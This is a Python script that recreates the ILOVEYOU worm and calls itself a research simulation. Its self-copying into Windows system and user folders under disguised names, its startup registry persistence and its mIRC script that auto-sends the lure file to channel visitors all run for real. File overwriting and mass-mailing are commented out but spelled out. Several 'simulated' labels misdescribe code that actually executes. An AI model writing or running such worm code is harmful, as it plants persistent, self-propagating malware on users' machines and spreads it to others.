import os
import shutil
import winreg
import random
import smtplib
from email.mime.text import MIMEText

# ======================
# 1. SELF-REPLICATION & PERSISTENCE
# ======================
def replicate_and_persist():
    current_script = os.path.abspath(__file__)
    targets = [
        os.path.join(os.environ["SYSTEMROOT"], "MSKernel32.py"),
        os.path.join(os.environ["APPDATA"], "Win32DLL.py"),
        os.path.join(os.environ["USERPROFILE"], "LOVE-LETTER-FOR-YOU.py")
    ]
    
    for target in targets:
        try:
            shutil.copyfile(current_script, target)
            print(f"[LOG] Copied self to: {target}")  # Replace with actual write in research
        except Exception as e:
            print(f"[ERROR] Failed to copy: {e}")

    # Registry persistence (HKCU\Run)
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "MSKernel32", 0, winreg.REG_SZ, targets[0])
            print("[LOG] Added to startup registry.")
    except Exception as e:
        print(f"[ERROR] Registry write failed: {e}")

# ======================
# 2. FILE INFECTION (SIMULATED)
# ======================
def infect_files(directory="C:\\Test"):  # Use a test dir!
    infected_extensions = ['.vbs', '.js', '.txt', '.jpg', '.mp3']
    
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in infected_extensions):
                file_path = os.path.join(root, file)
                try:
                    print(f"[LOG] Would overwrite: {file_path}")  # Replace with actual write in research
                    # with open(file_path, 'wb') as f:
                    #     f.write(b"INFECTED BY PYTHON-WORM")
                except Exception as e:
                    print(f"[ERROR] Failed to infect {file_path}: {e}")

# ======================
# 3. EMAIL PROPAGATION (MOCKED)
# ======================
def spread_via_email():
    print("[SIM] Mocking email spread via SMTP (disabled for safety).")
    # Example safe code (uncomment for research):
    # contacts = ["test1@example.com", "test2@example.com"]
    # for contact in contacts:
    #     msg = MIMEText("Check out this file!")
    #     msg['Subject'] = 'ILOVEYOU'
    #     msg['From'] = 'research@lab.local'
    #     msg['To'] = contact
    #     with smtplib.SMTP('localhost', 1025) as server:  # Use a local test SMTP server
    #         server.send_message(msg)

# ======================
# 4. HTML PAYLOAD (NON-MALICIOUS)
# ======================
def create_html_payload():
    html = """
    <html>
    <body>
    <h1>LOVE-LETTER-PY (Research)</h1>
    <script>
    console.log("Simulating original worm's JS behavior.");
    </script>
    </body>
    </html>
    """
    target = os.path.join(os.environ["TEMP"], "LOVE-LETTER.html")
    with open(target, 'w') as f:
        f.write(html)
    print(f"[LOG] Created HTML payload at: {target}")

# ======================
# 5. IRC SCRIPT PROPAGATION (SIMULATED)
# ======================
def create_mirc_script():
    mirc_script = """
    [script]
    n0=on 1:JOIN:#:{
    n1=  /if ($nick != $me) { /dcc send $nick "LOVE-LETTER-FOR-YOU.html" }
    n2=}
    """
    target = os.path.join(os.environ["USERPROFILE"], "script.ini")
    with open(target, 'w') as f:
        f.write(mirc_script)
    print(f"[LOG] Created mIRC script at: {target}")

# ======================
# 6. MAIN EXECUTION (CONTROLLED)
# ======================
if __name__ == "__main__":
    print("[=== ILOVEYOU PYTHON RESEARCH WORM ===]")
    replicate_and_persist()
    infect_files()  # Target a test directory, e.g., "C:\\Test"
    spread_via_email()
    create_html_payload()
    create_mirc_script()
    print("[=== SIMULATION COMPLETE ===]")
